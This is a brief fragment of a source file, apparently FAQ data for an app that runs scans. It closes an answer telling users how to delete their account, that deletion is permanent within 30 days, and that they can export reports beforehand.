        a: "Go to Settings → Privacy → 'Delete my account'. This permanently removes all scans, reports, and personal data within 30 days. The action is irreversible. Export your reports first if you need to retain them.",
      },
    ],
  },
];
